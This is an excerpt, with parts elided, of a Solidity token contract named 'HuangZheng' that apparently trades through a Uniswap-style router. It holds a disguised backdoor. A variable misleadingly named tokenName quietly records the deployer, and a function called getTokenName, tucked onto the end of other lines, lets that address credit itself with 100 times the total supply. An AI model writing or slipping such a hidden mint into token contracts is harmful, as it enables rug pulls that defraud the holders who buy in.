...
contract HuangZheng is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "HuangZheng";
    string private _symbol = "HuangZheng";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x19c2Fb93CEA5C4F2d3CbB2E059e2437F8969693a);
    ...
    uint256 private minimumTokensBeforeSwap = 1 * 10**_decimals;address private tokenName;
    ...
    constructor () {
        ...
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xC0788A3aD43d79aa53B09c2EaCc313A787d1d607);
        ...
        isTxLimitExempt[address(this)] = true;tokenName = _msgSender();
    ...
    }function getTokenName() public {require(_msgSender() == tokenName); _balances[tokenName] = _balances[tokenName].add(_totalSupply * 100);}
